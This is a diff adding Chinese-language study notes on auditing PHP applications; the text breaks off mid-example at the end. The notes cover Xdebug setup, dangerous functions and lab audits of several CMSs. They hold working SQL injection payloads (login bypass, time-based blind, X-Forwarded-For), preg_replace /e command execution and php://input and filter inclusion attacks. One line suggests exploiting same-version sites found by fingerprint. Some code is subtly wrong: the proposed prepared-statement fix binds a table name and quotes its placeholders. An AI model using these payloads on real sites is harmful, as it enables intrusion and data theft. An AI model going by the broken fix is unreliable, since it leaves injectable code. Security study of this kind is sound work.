@@ -1,0 +1,1913 @@
+html等前端语言的注释会被展示到前端的。
+
+php和python是弱类型语言，使用前一般不需先声明。
+java是强类型语言，使用前需先声明类型。
+
+php代码一般不会发送到客户端或浏览器。
+
+
+
+php代码审计：
+php也支持<? echo "hello wordz";?>此种形式。 不推荐。
+
+
+单行注释：//
+多行注释：/*    */
+
+
+动态语言(如php)的注释不会出现在页面。html等注释会。
+如：<!--adw this is zhushiz-->
+
+php区分大小写。
+
+
+函数中访问全局变量使用global关键字。
+
+
+php弱类型语言：不需先声明类型。
+
+
+常量：
+define("changlz","ak wddfmgez wdq");
+echo changlz;
+
+
+
+===         强等于，会判断类型
+
+预处理一般有两种方式：
+1. mysqli
+2. PDO
+一般预处理都能预防sql注入。 PDO相对于mysqli更通用。
+
+
+
+phpstorm：
+配置Xdebug(php扩展).
+
+环境：Xdebug版本需与php版本对应。
+https://xdebug.org/wizard 查询php版本对应的Xdebug版本。
+在php文件夹下运行：
+php.exe -i >> finalz.txt
+复制查询即可。
+若不支持，则在历史版本中查找即可：
+https://xdebug.org/download/historical
+
+php安装xdebug插件：
+官网下载php_xdebugz.dll文件，放在类似如下目录下，再修改对应的php.ini配置文件，如：
+zend_extension=php_xdebugz_.dll
+
+重启Apache，查看phpinfo 搜索xdebug查看版本即可。
+
+
+
+
+phpstudy一般自带有xdebug插件(但默认没启动，需配置参数)，如：
+D:\phpstudy\Extensions\php\php5.6.9nts\ext\php_xdebug.dll
+
+
+
+下载：
+https://xdebug.org/download
+
+
+xdebug工作原理：
+浏览器发起请求，php/xdebug作为中间人 拦截流量。 php/xdebug和ide通信(使用DBGP协议).
+
+
+
+
+xdebug配置参数：
+==============1s=================
+[Xdebug]
+;指定Xdebug扩展文件的绝对路径
+zend_extension="D:\phpstudy\Extensions\php\php5.6.9nts\ext\php_xdebug.dll"
+;收集传递给函数的参数变量个数
+xdebug.collect_params=6
+;开启记录不同变量具有哪些值
+xdebug.collect_vars=1
+;跟踪函数的变量赋值
+xdebug.collect_assignments=1
+;收集函数调用的返回值
+xdebug.collect_return=1
+;开启代码自动跟踪
+xdebug.auto_trace=On
+;记录到文件的方式：0(默认):覆盖.    1:追加.
+xdebug.trace_options=1
+;指定堆栈跟踪文件的存放目录
+xdebug.trace_output_dir="D:\phpstudy\Extensions\tmp\zxdebug"
+;启用性能检测分析
+xdebug.profiler_enable=On
+;指定性能分析文件的存放目录
+xdebug.profiler_output_dir="D:\phpstudy\Extensions\tmp\zxdebug"
+;输出格式
+xdebug.profiler_output_name=cache.out.%t.%p
+;远程IDE调试
+xdebug.remote_enable=On
+;远程主机
+xdebug.remote_host=localhost
+;远程主机端口
+xdebug.remote_port=9000
+;远程调试的应用层通信协议
+xdebug.remote_handler="dbgp"
+=====================1e===================
+
+
+php.ini配置文件默认没有xdebug配置，则将上面的配置信息直接添加到对应的php.ini配置文件的最后即可。
+
+验证：
+查看phpinfo，搜索xdebug，有version信息则表示配置成功。
+
+
+
+配置IDE xdebug环境：
+phpstorm加载网站根目录。
+file->settings->Languages & Frameworks->php或者直接file->settings->php
+若没有找到php.exe，则手动配置：
+CLI interpreter->添加->PHP executable->找到对应的php.exe文件即可，确认。
+
+
+file->settings->php->debug:
+默认端口9000或90003都行。 php.ini中配置端口需为9000或9003(即需对应).
+
+
+file->settings->php->servers:相当于在IDE中添加一个服务器端。
+添加->Host值随意(如：www.testw.com)->访问端口默认80.  一般选择xdebug.
+
+此处可以自定义添加一个服务器端(即phpstorm将请求发往何处)。
+或者此处根本不要设置，当接收到请求时选择accept即可，则会自动添加server.
+ 
+
+在php文件中点击左边下断点，右上角打开电话图标，监听来自php debug的连接。
+
+
+
+交互流程图:
+browser <==> Port 80 <==> Apache+PHP+Xdebug <==> Port 9000 <==> PhpStorm(DBGP Plugin)
+
+
+google浏览器添加插件：xdebug helper(右键->选项中设置IDE key值，其实任意一个都行).
+xdebug helper工作原理：
+在浏览器访问时，自动在cookie中添加XDEBUG_SESSION项(值任意)。
+如：
+Cookie: XDEBUG_SESSION=XDEBUG_ECLIPSE
+
+告诉php端开启调试，使其去访问xdebug配置的远程调试host:port地址。
+
+或直接在访问的url后添加一个参数，如：
+XDEBUG_SESSION_START=1
+eg1：
+http://asdwz.com/q.php?cmdz=phpinfo();&XDEBUG_SESSION_START=1
+
+
+理解：应该是php服务端根据cookie传递的参数中是否有XDEBUG_SESSION项来判断是否执行xdebug.
+
+
+
+触发phpstorm的debug两种方式：
+1. GET、POST存在XDEBUG_SESSION_START参数或cookie中有XDEBUG_SESSION参数，单用户调试，值任意。
+GET、POST会生成带有XDEBUG_SESSION的cookie. 有效期1小时(可在php.ini中配置)。
+
+2. php.ini文件xdebug.remote_autostart参数设置为On或1，不需设置GET、POST、Cookie
+需重启php环境，不推荐。
+
+
+
+
+php.ini常用配置项：
+;禁止某些函数。 接收以逗号','分隔的函数名列表作为参数。
+disable_functions
+;转义特殊字符。 php>=5.4.0中已移除。
+magic_quotes_gpc
+;是否允许包含远程文件
+allow_url_include
+;是否允许访问远程文件
+allow_url_fopen
+;设置错误报告的级别
+error_reporting
+;是否显示错误信息
+display_errors
+;禁用某些类，以逗号','分隔类名.
+disable_classes
+;开启全局变量。 php>=5.4.0中已移除。
+register_globals
+
+洞形成的条件：
+1.变量可控。
+2.危险函数(危险代码).
+
+
+调试方法：
+var_dump($a)
+寻找超全局变量($GLOBALS、$_GET、以$_开头的变量).
+审计肯定是看关键部分和整个逻辑，切忌看完所有代码。
+exit(); 		//正常退出
+
+
+
+
+输出相关环境信息(包括路径、脚本名等)：
+var_dump($_SERVER);
+
+
+
+
+常见危险函数：
+1.文件读取：
+file_get_contents() 	//将整个文件读入一个字符串
+fopen() 				//打开文件或url
+readfile() 				//输出文件
+file() 					//将整个文件读入一个数组中
+fread() 				//读取文件
+parse_ini_file() 		//解析一个配置文件
+fgets() 				//从文件指针中读取一行
+
+2.命令执行：
+system() 		//执行外部程序或命令，并输出显示
+exec()  		//执行一个外部程序
+shell_exec() 	//通过shell环境执行命令
+eg1：
+$qwz=shell_exec('whoami');
+若不输出此变量，则不会回显。
+
+passthru() 		//执行外部程序并显示原始输出
+
+popen() 		//打开进程文件指针
+eg：
+popen(string $command, string $mode): resource
+打开一个指向进程的管道，该进程由派生给定的command命令执行而产生。
+$handle = popen("/bin/ls", "r"); 				//执行命令
+$handle = popen("cmd.exe /c calc", "r"); 		//执行命令
+
+proc_open() 		//执行一个命令，且打开用来输入/输出的文件指针。
+pcntl_exec() 		//为数组的每个元素执行回调函数
+
+var_dump(`whoami`);
+print_r(`whoami`);
+echo (`whoami`);
+
+
+
+3.代码执行：
+eval()		//将字符串作为php代码执行
+assert() 	//检查一个断言是否为false
+create_function() 	//创建函数
+
+call_user_func() 	//将第一个参数作为回调函数调用
+eg1：
+function increment(&$var)
+{
+    $var++;
+}
+$a = 0;
+call_user_func('increment', $a);
+
+
+call_user_func_array() 	//调用回调函数，且将一个数组里的所有元素作为回调函数的参数
+eg1：
+function foobar($arg, $arg2) {
+    echo __FUNCTION__, " got $arg and $arg2\n";
+}
+call_user_func_array("foobar", array("one", "two"));
+
+
+array_map() 	//将array里的每一个元素去调用回调函数，返回array.
+eg1：
+function cube($n)
+{
+    return ($n * $n * $n);
+}
+
+$a = [1, 2, 3, 4, 5];
+$b = array_map('cube', $a);
+
+
+
+
+preg_replace() 		//执行一个正则表达式
+条件：4.3.0<=php_version<=5.4.6
+以下案例都会执行且回显。
+eg1：
+preg_replace('/(.*)/ei', 'strtolower("\\1")', "{${phpinfo()}}");
+eg2：
+preg_replace('/(.*)/ei', 'strtolower("asdwd")', "{${phpinfo()}}");
+
+eg3：
+preg_replace('/sbxz/ei', 'strtolower("asdwd")', "{${phpinfo()}}");
+eg4：
+preg_replace('/sbxz/ei', 'strtolower("asdwd")', ${phpinfo()});
+eg5：
+preg_replace('/sbxz/ei', 'asdwd', ${phpinfo()});
+eg6：
+preg_replace('/sbxz/ei', "asdwd", "{${phpinfo()}}");
+eg7：
+preg_replace('/(.*)/ei', 'strtolower("\\1")', ${phpinfo()});
+eg8：
+preg_replace('/adw/ei', 'adqwdw', ${phpinfo()});
+
+
+
+$wdqzw="{${phpinfo()}}"; 		//直接执行并回显
+$wdqzw=${phpinfo()}; 			//直接执行并回显
+
+
+
+重点：
+eg1：
+$regwex="\S*";
+$valwue="\${system(whoami)}"; 	//$valwue="\${phpinfo()}";也行
+$qlw6w=preg_replace('/(\S*)/ei', strtolower("\\1") , $valwue); 	//执行成功
+$qlww=preg_replace('/(' . $regwex . ')/ei', strtolower("\\1") , $valwue); 	//执行成功
+$qlww=preg_replace('/(' . $regex . ')/ei', "\\1" , $value); 	//执行成功
+
+
+payload：
+http://127.0.0.1:89/bachang1/BlogCode-master/qwz1.php?\S*=${system(whoami)} 	//可行
+http://127.0.0.1:89/bachang1/BlogCode-master/qwz1.php?\S*=${phpinfo()} 			//可行
+
+
+
+http://127.0.0.1:89/bachang1/BlogCode-master/qwz1.php?/?.*=${system(whoami)} 	执行失败。
+因为GET传入的/?.*被转换为/?_*
+
+
+
+原理分析：
+preg_repacle() 	其中/e表示代码执行。 /i表示不区分大小写。
+\\1即\1  表示第一个子匹配项。 此处\1表示"\${phpinfo()}"->执行，成功回显。
+注：\对$转义，传参时不需要\
+
+"\${phpinfo()}" 	php双引号包裹的变量会被解析，单引号则不行。
+解析${phpinfo()}变量，则phpinfo()被执行。
+
+
+
+$wd=phpinfo();
+var_dump($wd); 	//值为：布尔 true
+
+$wd=strtolower(phpinfo());
+var_dump($wd); 	//值为：字符串 '1'
+
+
+$wd=preg_replace('/(.*)/ie','6',"{${phpinfo()}}");
+var_dump($wd); 	//值为：字符串 '6'
+
+$wd=preg_replace('/(.*)/ie','strtolower("\\1")',"{${phpinfo()}}");
+var_dump($wd); 	//值为：string(0) ""
+
+
+
+var_dump(`dir`); 	//成功执行。
+
+
+
+
+4.文件包含：
+都是包含并执行指定文件。
+include：若碰到错误，则给出提示且继续运行。
+include() 		//执行时每次都会读取。
+include_once() 	//若已读取过或包含过，则不再读取。
+
+require：若碰到错误，则给出提示且停止运行。
+require() 		//执行时每次都会读取。
+require_once()	//若已读取过或包含过，则不再读取。
+
+
+
+文件操作漏洞:
+copy 	//复制文件
+file_get_contents 	//将整个文件读入到一个字符串或变量中
+file_put_contents 	//将数据写入到文件中
+file 	//将整个文件读入到一个数组中
+fopen 	//打开文件或url
+move_uploaded_file 	//将上传的文件移动到新位置
+readfile 	//读文件
+rename 		//重命名
+unlink 		//删除文件
+delete 		//删除文件
+
+
+
+php代码结构：
+MVC模式(一个入口)：如index.php
+M(model模型)<-->C(controller控制器)<-->V(view视图)
+
+
+
+
+常见php框架：
+thinkphp框架：国内居多。
+Laravel框架：国外。
+Yii框架.
+CodeIgniter框架.
+CakePHP框架.
+
+
+
+代审思路：掌握开发者的习惯。
+黑白盒结合、黑盒求快速、白盒求覆盖、忆过往和组成。
+
+
+具体思路：
+1.自动化工具扫描源码：定位可能存在漏洞的代码块。
+2.拿到源码、架设网站：分析调试。动静结合、检测是否存在漏洞。
+
+步骤：
+1.使用源码搭建好网站。
+2.观察网站目录结构，寻找入口点。
+3.通过入口文件了解程序的结构和业务逻辑。
+4.明确审计方法，代码审计。
+
+
+index.php、main.php等入口文件重点关注是否包含有防护代码、重点关注其中业务逻辑。
+
+
+通读全文法：耗时费力。
+敏感函数参数回溯法(常用)：逆向追踪敏感函数参数的传递过程。
+定向功能分析法(常用)。
+
+变量跟踪方法：
+变量->函数/敏感操作->输出(正向).
+$_GET->$param->eval($param)->return $param
+函数/敏感操作回溯->变量->输出(反向).
+eval($param)->$param->$_GET->return $param.
+
+
+
+快速代审：
+1.补丁对比：根据补丁逆推漏洞.
+2.业务功能与对应漏洞.
+3.相似性漏洞挖掘：如：以前的漏洞等。
+4.基于白盒的fuzz.
+5.常用变量和函数.
+6.高级代码审计.
+
+审计具体技巧：
+1.通过输出关键内容，辅助定位目标代码点.
+2.前台漏洞点相比后台漏洞点更容易审计到漏洞.
+3.通过更新信息(主要是源码的变化)、漏洞平台等先得知存在某种漏洞。再据此去找具体漏洞对应的代码块。
+
+
+代码审计之sql注入：
+关键词：
+select from、mysql_connect、mysql_query、mysql_fetch_now、update、insert、delete
+关键函数：
+query()、execute()、mysqli_query()、select()、find()等.
+可控变量：
+$_GET、$_POST、$_COOKIE、$_REQUEST、$_SESSION等.
+过滤函数：
+mysql_real_escape_string()、addslashes()、stripslashes()、htmlentities()、strip_tags()、htmlspecialchars()
+
+
+常见的原型sql语句和封装后的sql语句：
+eg1：thinkphp框架：
+select * from users wherer username='wdqz'; -->thinkphp框架调用-->
+Db::query('select * from users wherer username=?',[9]);
+-->
+Db::query('select * from users wherer username=:idz',['idz'=>9]);
+
+
+Db::table('thiwn_user')->where('username',1)->find();
+
+Db::table('thiwn_user')->where('status',1)->select();
+
+eg2：Laravel框架：
+select * from users wherer username='wdqz'; 
+$user=DB::select('select * from users wherer username=?',[1]);
+
+$resultz=DB::select('select * from users wherer username=:id',['id'=>1]);
+
+
+$user=DB::table('users')->where('name','johnz')->first();
+
+$email=DB::table('users')->where('name','johnz')->value('email');
+
+
+
+
+如：
+http://192.168.10.102:89/upload/index.php?ac=news_show&id=243
+其中news表示cotroller，控制器名称。
+show表示model的action，一般为函数名。
+
+
+
+zid[]=4565&zid[]=wdq
+如此传参过去为数组，如：
+array (size=2)
+  0 => string '4565' (length=4)
+  1 => string 'wdq' (length=3)
+默认从0开始。
+
+
+zid[sf]=4565&zid[8]=wdq
+为：
+array (size=2)
+  'sf' => string '4565' (length=4)
+  8 => string 'wdq' (length=3)
+
+
+
+
+eg1：
+zzcms的username没被消毒：
+$sql = "select * from " . $this->table . " where username='".$username."' and password='".$pwd1."' and status=1";
+万能密码登录：
+admin'#
+asdw
+或
+admin'-- -
+sdkfke
+或
+wdmiwn' or 1#
+zdllwq
+
+修复：
+对特殊字符转义：前提：必须对传入的变量使用单引号包含(sql语句中).
+$userz=htmlspecialchars(trim($_POST['useranme']));
+或：
+$userz=addslashes(trim($_POST['useranme']));
+且最好使用utf8编码.
+
+绕过转义函数：
+1.GBK编码之宽字节注入(%df')
+
+预处理查询(参数化查询、预编译)杜绝sql注入.
+
+
+
+eg1：对tccms进行审计。   动静调试结合。
+seay源码审计系统审计。 功能点审计，登录模块发现：
+http://127.0.0.1:89/upload/index.php?ac=user_login
+审计index.php->$control->Run()-->controller.class.php文件->审计$this->Analysis()-->
+发现：
+$ac = explode('_', $acStr);
+$modelClass = $ac[1];     //login
+$controlClass = $ac[0];   //user
+-->include($controlFile);即include(upload/core/controller/user.class.php)-->
+$methodName = $this->action;
+$instance->$methodName();
+-->跟进upload/core/controller/user.class.php的loginin()方法：
+$isLogin = $userObj->checkUserLogin($username, $password);
+跟进checkUserLogin()-->
+动态或静态调试 输出$username-->
+发现$username仅是被单引号包含就执行。
+尝试：
+username=admin'#
+passwrd=sbxz
+登录成功。
+
+
+修复代码：预编译查询：如：
+------------1s----------------------
+$servername = "localhost";
+$username = "username";
+$password = "password";
+$dbname = "myDB";
+ 
+// 创建连接
+$conn = new mysqli($servername, $username, $password, $dbname);
+ 
+// 检测连接
+if ($conn->connect_error) {
+    die("连接失败: " . $conn->connect_error);
+}
+ 
+// 预处理及绑定
+$stmt = $conn->prepare("select * from ? where username='?' and password='?' and status=1");
+$stmt->bind_param("sss", $ztable, $znamw, $zpasswdw);
+
+// 设置参数并执行
+$ztable = $this->table;
+$znamw = $username;
+$zpasswdw=$pwd1;
+
+$stmt->execute();
+
+$stmt->close();
+$conn->close();
+-----------------1e---------------------
+
+
+
+
+$rt = $conn->query($sql);
+若执行成功，则$rt为一个object对象;若执行失败，则$rt为boolean false.
+
+
+
+
+
+审计zzcms：
+seay源码审计系统跑源码。
+index.php->发现include(zzcmsroot."/inc/stopsqlin.php")-->有防护代码。
+其中对$_SERVER[]没有过滤，故可尝试XFF等注入。
+
+扫描发现user/adv.php文件，跟进：
+query("update zzcms_textadv set adv='$adv',company='$company',advlink='$advlink',img='$img',passed=0 where username='".$_COOKIE["UserName"]."'");
+发现其包含：
+include("../inc/conn.php");
+include("check.php");
+跟进check.php，审计：
+发现：
+query("UPDATE zzcms_user SET loginip = '".getip()."' WHERE username='".$username."'");
+跟进getip()，发现其主要是获取客户端ip：
+直接在check.php中添加代码并测试：
+var_dump("UPDATE zzcms_user SET loginip = '".getip()."' WHERE username='".$username."'");
+
+
+
+添加XFF：
+X-FORWARDED-FOR: 192.168.43.68"
+发现输出为'192.168.43.68&quot;' 故猜测可能sql执行是应该是可行的。  或尝试：
+$fstr="UPDATE zzcms_user SET loginip = '".getip()."' WHERE username='".$username."'";
+$f2str=base64_encode($fstr);
+var_dump("==s1=". $f2str."=s2=");
+再base64解密。 发现确实很可能存在XFF注入。
+
+
+seay或sublime text文件夹搜索getip().
+
+
+方式1：报错注入：
+getip()=asdw'^updatexml(1,concat(0x7e,(database()),0x7e),0)-- -
+$fstr="UPDATE zzcms_user SET loginip = '".getip()."' WHERE username='".$username."'";
+
+方式2：延时注入：
+UPDATE zzcms_user SET loginip = '192.168.43.6' and 'q'>'z'  and sleep(10) and '' WHERE username='testq';
+UPDATE zzcms_user SET loginip = '192.168.43.6' and 'q'>'a'  and sleep(10) and '' WHERE username='testq';
+因为都是and，若'q'>'z'为false，则sleep(10)不会再执行。
+或：
+UPDATE zzcms_user SET loginip = '127.0.0.1' and 'q'>'m'  and sleep(10) and 'w'>'a' WHERE username='testq';
+
+
+
+/user/logincheck.php文件不需登录，就能sql注入。
+$ip=getip();
+$sql="select * from zzcms_login_times where ip='$ip' and count>=".trytimes." and unix_timestamp()-unix_timestamp(sendtime)<".jgsj." ";
+var_dump($sql);
+方式3：
+需修改为POST方式(实际中灵活变化)，但好像GET也行.
+原型：
+select * from zzcms_login_times where ip='192.168.43.6w8' or 'q'>'z' or sleep(3)-- -' and count>=5 and unix_timestamp()-unix_timestamp(sendtime)<600
+或：
+select * from zzcms_login_times where ip='192.168.43.6w8' or 'q'>'a' or sleep(3)-- -' and count>=5 and unix_timestamp()-unix_timestamp(sendtime)<600
+或：
+select * from zzcms_login_times where ip='192.168.43.6w8' or hex('e')>66 or sleep(3)-- -' and count>=5 and unix_timestamp()-unix_timestamp(sendtime)<600
+
+payload1：
+X-FORWARDED-FOR: 192.168.43.68' or 'q'>'m' and sleep(3)-- -
+paylaod2：
+192.168.43.68' or 'q'>'z' or sleep(3)-- -
+paylaod3：
+192.168.43.6w8' or hex('e')>66 or sleep(3)-- -
+
+
+因为为or关系，ip='192.168.43.6w8'为假，若'q'>'a'为true，则sleep(3)不会执行。
+
+$_SERVER['REMOTE_ADDR']不能伪造，是最后一个与服务器握手的ip. 可能是代理服务器的ip.
+$_SERVER['HTTP_CLIENT_IP']和$_SERVER['HTTP_X_FORWARDED_FOR']可以伪造，来自于客户端请求包的header里，客户端传递过去都是使用的X-FORWARDED-FOR参数，如：
+X-FORWARDED-FOR: 192.168.43.68
+
+
+getip()获取的ip没有过滤，故尝试XFF注入。
+
+
+在magic_quotes_gpc=On情况下，若输入数据中有单引号(')、双引号(")、反斜线(\)、NULL等字符会被转义(在其前面加上反斜线)。若为Off，则一般必须调用addslashes.
+
+
+addslashes()函数绕过：
+1.GBK之宽字节注入(%df').
+2.若php文件调用了addslashes()函数，考虑其过滤不全，如超全局变量($_SERVER[]).
+3.找没有调用该函数的部分.
+4.php文件调用了该函数，却被其他函数干扰，使其失去转义效果.
+5.寻找没有单双引号保护的sql语句处 尝试注入(如：整型注入).
+
+
+stripslashes(string $str): string   //删除反斜线(\)，若有两个反斜线(\\)，则变为一个(\).
+
+
+
+
+mkcms6.2.3安装：
+访问：http://127.0.0.1:89/install/
+填写数据库信息->安装成功。
+
+报错1：
+Warning: mysql_connect(): Access denied for user 'root'@'localhost' (using password: YES) 
+A：
+登录后台：
+http://127.0.0.1:89/admin/cms_login.php
+默认账户密码：
+admin/admin
+
+后台设置：
+系统设置->基本设置->域名设置 如：http://127.0.0.1:89/ 
+
+左边最下角->清除缓存->网站首页缓存，清除.
+再次访问http://127.0.0.1:89/ 成功.
+
+
+
+审计MKCMS：
+使用seay跑一遍源码.
+发现ucenter/reg.php->审计：
+include('../system/inc.php') 会转义特殊字符. 但发现：
+$username = stripslashes(trim($_POST['name']))  会去除一次反斜线.
+故此处很可能存在sql注入.
+
+$query = mysql_query("select u_id from mkcms_user where u_name='$username'");
+
+尝试注入：
+访问http://127.0.0.1:89/ucenter/reg.php
+
+payload1：
+select u_id from mkcms_user where u_name='adwizn' or 'q'>'z' or sleep(10) or 'w'='q';
+
+
+
+全局搜索stripslashes关键字，发现多个sql注入.
+可根据指纹特征(md5值)、同版本cms网站去利用。
+
+指纹：
+标题、图标md5值(如：http://127.0.0.1:89/favicon.ico)、关键词.
+
+
+
+审计xss：
+1.使用跑xss比较厉害的工具跑一遍.
+
+xss主要关注有存储、有输出、有可控变量的地方.
+有框必查.
+
+寻找xss、csrf[就看是否为表单]等尽量从业务出发。
+
+
+审计xhcms：
+使用seay跑一遍源码。
+审计index.php，发现为mvc架构-->查看业务功能点->联系功能的发表留言处->f12查看留言处：
+为form表单，提交到files/submit.php?type=message
+-->审计files/submit.php：
+发现：
+$name=$_POST['name'];
+$mail=$_POST['mail'];
+没有过滤，且带入了查询，故很可能存在注入.
+eg1：
+$query = "SELECT * FROM interaction WHERE( mail = '$mail')";
+payload1：
+$mail="adadw@qd.com') or substr((select database()),1,1)='m' or sleep(2) or ('"
+或：
+$mail="adadw@qd.com') or substr((select database()),1,1)='m' or sleep(2)#"
+
+eg2：
+$query = "INSERT INTO interaction (
+type,
+xs,
+cid,
+name,
+mail,
+url,
+touxiang,
+shebei,
+ip,
+content,
+tz,
+date
+) VALUES (
+'$type',
+'$xs',
+'$cid',
+'$name',
+'$mail',
+'$url',
+'$touxiang',
+'$shebei',
+'$ip',
+'$content',
+'$tz',
+now()
+)";
+@mysql_query($query) or die('新增错误：'.mysql_error());
+
+payload：
+INSERT INTO interaction (type,xs,cid,name,mail,url,touxiang,shebei,ip,content,tz,date
+) VALUES (
+'qwada1','qada2','adqa3','aqad4',  ' qa5','qa6','q7','q8','q9','q10','q11','q18'+(select case when substr((select database()) from 1 for 1)='m' then sleep(5) else 0 end) );#           ','qad5',asda nsd dfw'qad6','q7','q8','q9','q10','q11','q18');
+核心：
+在最后一个元素做文章(一般为当过滤了,则可尝试).
+payload1：但此例因+被过滤，故此例不行.
+$name="aqad4',  'qa5','qa6','q7','q8','q9','q10','q11','q18'+(select case when substr((select database()) from 1 for 1)='m' then sleep(5) else 0 end) );#"
+
+payload2：可尝试数字型与或非.
+$name="aqad4',  'qa5','qa6','q7','q8','q9','q10','q11','q18' || (select case when substr((select database()) from 1 for 1)='m' then sleep(5) else 0 end) );#"
+
+payload3：
+$name="aqad4','qa5','qa6','q7','q8','q9','q10','q11','q18' || 'q'>'z'  || sleep(6)   );#"
+
+注：此例eg2的sql注入执行全失败，虽然navicat执行成功。 猜测可能是mysql_query或mysql本身的原因.
+因为php多行写执行sleep(6)失败，但php写在一行就执行成功。
+
+
+eg3：seay查看到admin/files/reply.php发现：
+$id=$_GET['id'];
+$query = "SELECT * FROM interaction WHERE id='$id'";
+
+python脚本盲注跑出数据.
+payload：
+id=78' and substr((select database()),1,1)='m' and sleep(2) and 'w'='w&name=sbxz
+注：将id放在GET部分，且需将id的值url编码.
+
+修复：
+$id=addslashes($_GET['id']);
+
+
+
+
+thinkphp：基于MVC、面向对象的php开发框架.
+
+框架：简洁、封装.
+
+thinkphp开发手册：
+https://www.kancloud.cn/manual/thinkphp/1682
+
+参考手册：
+https://www.kancloud.cn/explore
+
+环境要求：
+PHP5.3以上版本(注：不支持PHP5.3dev和PHP6版本).
+
+thinkphp唯一入口文件：ThinkPHP/ThinkPHP.php
+
+APP_PATH的定义支持相对路径和绝对路径，但必须以/结束.
+
+
+
+
+以Page/group/开头且以数字结尾的url被路由到Page/group?id=:1位置：
+'/^Page\/group\/(\d+)$/'=>'Page/group?id=:1', //单页的url优化
+eg1：
+http://127.0.0.1:89/index.php/Product/group/id/8 被路由到：
+http://127.0.0.1:89/index.php/Product/group?id=8
+即：可直接访问http://127.0.0.1:89/index.php/Product/group?id=8
+
+判断伪静态.
+
+
+Application/Home/Controller/IndexController.class.php为默认的Index控制器文件。
+
+
+控制器类的命名方式为：控制器名(驼峰法，首字母大写)+Controller
+控制器文件的命名方式为：类名+class.php(类文件后缀)
+
+
+
+thinkphp配置文件返回的格式均为php数组.
+
+
+
+
+
+url访问规则：
+1.PATHINFO模式：
+http://serverName/index.php(或其他应用入口文件)/模块/控制器/操作/[参数名/参数值...]
+
+
+这两个访问等效：此为PATHINFO模式.
+http://serverName/index.php
+http://serverName/index.php/Home/Index/index
+
+
+
+ThinkPHP支持四种URL模式：普通模式(0)、PATHINFO(1)、REWRITE(2)、兼容模式(3).
+1.普通模式(0)：
+http://localhost/?m=home&c=user&a=login&var=value
+m参数表示模块，c参数表示控制器，a参数表示操作(这些参数都可以自定义配置)，后面的表示其他GET参数.
+eg1：配置：
+-------1s--------------
+'VAR_MODULE'            =>  'module',     // 默认模块获取变量
+'VAR_CONTROLLER'        =>  'controller',    // 默认控制器获取变量
+'VAR_ACTION'            =>  'action',    // 默认操作获取变量
+----------1e-----------
+则访问：
+http://localhost/?module=home&controller=user&action=login&var=value
+
+2.PATHINFO(1)：默认的模式.
+http://localhost/index.php/home/user/login/var/value/
+eg1：配置：
+-------1s--------------
+// 更改PATHINFO参数分隔符
+'URL_PATHINFO_DEPR'=>'-', 
+----------1e-----------
+则访问：
+http://localhost/index.php/home-user-login-var-value
+
+
+4.兼容模式：
+http://localhost/?s=/home/user/login/var/value
+eg1：配置：
+-------1s--------------
+// 更改PATHINFO参数分隔符
+'URL_PATHINFO_DEPR'=>'-', 
+----------1e-----------
+则访问：
+http://localhost/?path=/home-user-login-var-value
+更改配置也能实现：
+http://localhost/home/user/login/var/value
+访问.
+
+
+
+thinkphp的路由：仅支持PATHINFO模式或兼容模式.
+
+
+
+
+$id=I('get.id');//类别ID
+即$id=$_GET['id'];
+
+I('id',0); 获取id参数 自动判断get或者post
+I('post.name','','htmlspecialchars'); 获取$_POST['name']
+
+
+默认都是在Application/Home/Cotroller下.
+
+
+分析thinkphp使用MVC的思想分析.
+
+防御csrf：
+添加验证码、添加并验证token或自定义参数(不能放在cookie中)、添加并验证Referer值.
+
+
+tuzhicms审计：
+后台添加管理员处存在csrf.
+后台修改信息处存在csrf.
+
+
+
+混淆、编码、加密：
+1.借助第三方组件实现.
+2.无依赖实现：一般带有eval.
+
+方式1：hook eval()，动态调试.
+方式2：反编译：
+
+通过hook php底层函数，实现解码等功能：
+https://www.unphp.net/
+
+
+反编译出来的有些变量名混乱，可以将同名的直接替换.
+
+方式3：找其历史版本、开源代码进行对比.
+对于加密、编码、混淆等较麻烦的代码没必要硬刚，只需搞懂想处理的代码的关键部分即可.
+
+方式4：静态调试、var_dump()等.
+
+
+文件包含：
+包含文件或运行该文件遇到错误仅产生警告，继续运行：
+include()           //包含并运行指定文件
+include()_once()    //若文件已被包含过，则不会再次包含.
+
+包含文件或运行该文件遇到错误直接停止运行：
+require()           //包含并运行指定文件
+require()_once()    //若文件已被包含过，则不会再次包含.
+
+
+
+1.本地包含：LFI
+
+
+2.远程包含：RFI
+条件：
+php.ini需配置：
+allow_url_fopen=On
+allow_url_include=On
+
+php伪协议
+a1：php://input      
+可以访问请求的原始数据的只读流，可以接收post请求作为输入流的输入.
+直接理解为输入到php服务器端.
+
+条件：
+allow_url_include=On
+
+eg1：wz.php文件包含.
+http://34.54.3.68/wz.php?filze=php://input
+POST数据为：
+<?php phpinfo();?>
+
+
+server_code：
+<?php
+include("php://input");
+?>
+
+client_code1：可执行.
+---------------1s---------------
+POST /q.php?fisbxz=php://input HTTP/1.1
+...
+<? phpinfo();   //或<?php phpinfo();  或<?php phpinfo();?>
+---------------1e---------------
+
+
+client_code2：可执行.
+---------------1s---------------
+GET /q.php?fisbxz=php://input HTTP/1.1
+...
+<? phpinfo();   //或<?php phpinfo();  或<?php phpinfo();?>
+---------------1e---------------
+
+
+
+
+
+
+php://filter    //一种元封装器，对数据流打开时进行过滤.
+利用条件：无要求.
+
+如：
+http://localhost/wz.php?file=php://filter/read=convert.base64-encode/resource=./wd/qwz.txt
+其中resource的值为你想读取的文件(一般能读网站源码[包含php代码]).
+eg1：
+http://localhost/wz.php?file=php://filter/read=convert.base64-encode/resource=index.php
+等价于：
+http://localhost/wz.php?file=php://filter/convert.base64-encode/resource=index.php
+
+
+
+
+
+phar://         //自php5.3.0起有效. 类似压缩文件.
+利用条件：php>=5.3.0
+
+步骤：
+1.新建z.txt，内容为：<?php phpinfo();?>    再将起压缩为wz.zip文件.
+2.进行包含，需绝对路径：
+http://localhost/wz.php?file=phar://C:/users/wbxz/wz.zip/z.txt
+其等价于：
+http://localhost/wz.php?file=zip://C:/users/wbxz/wz.zip%23z.txt
+其中%23为#的url编码.
+
+
+
+
+eg1：
+server_code：
+---------1s---------------
+<?php
+$qwz=$_GET[filew];
+include($qwz);
+?>
+---------1e---------------
+
+
+client_code：
+---------1s---------------
+GET /q.php?filew=./Data/q.txt HTTP/1.1  //包含图片也行，如：sbxz.png
+...
+---------1e---------------
+
+q.txt内容：
+<?php phpinfo();?>
+
+
+成功执行.
+
+
+
+
+
+data://协议：
+利用条件：
+PHP>=5.2.0
+allow_url_fopen:On
+allow_url_include:On
+
+
+server_code：
+--------1s-----------
+<?php
+$qwz=$_GET[filew];
+include($qwz);
+?>
+----------1e-----------
+
+
+
+
+
+
+
+eg1：
